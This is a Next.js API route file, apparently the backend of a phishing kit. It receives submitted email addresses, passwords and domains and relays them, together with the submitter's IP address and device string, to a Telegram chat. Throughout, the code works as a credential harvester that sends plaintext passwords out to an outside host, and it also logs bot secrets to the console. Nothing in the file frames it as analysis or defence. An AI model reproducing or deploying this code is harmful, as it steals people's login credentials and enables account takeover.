// app/api/log-submit/route.ts
export const runtime = 'nodejs';

import { NextRequest, NextResponse } from 'next/server'
import { logToTelegram } from '../../../lib/telegramLogger'

export async function POST(req: NextRequest) {
  try {
    // 1) Debug your Telegram env
    console.log('> Telegram ENV:', {
      TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
      TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
    })

    const body = await req.json()
    const { email, password, domain } = body

    if (!email || !password) {
      return NextResponse.json(
        { error: 'Missing email or password' },
        { status: 400 }
      )
    }

    // 2) Gather metadata
    const timestamp = new Date().toISOString()
    const ip =
      req.headers.get('x-forwarded-for') ||
      (req as any).ip || // fallback
      'Unknown IP'
    const userAgent = req.headers.get('user-agent') || 'Unknown device'

    const message = `
🔐 Login Submitted:
📧 Email: ${email}
🔑 Password: ${password}
🌐 Domain: ${domain || 'Not provided'}
🕒 Time: ${timestamp}
🌍 IP: ${ip}
💻 Device: ${userAgent}
    `.trim()

    // 3) Debug the exact payload
    console.log('> Telegram payload:', JSON.stringify({
      chat_id: process.env.TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    }))

    // 4) Fire off the Telegram log (will throw on non-2xx if you modified logToTelegram)
    await logToTelegram(message /*, false for Markdown, or true for HTML */)

    return NextResponse.json({ ok: true })
  } catch (error: any) {
    console.error('💥 Telegram log error:', error)
    return NextResponse.json(
      { error: error.message || 'Failed to log to Telegram' },
      { status: 500 }
    )
  }
}
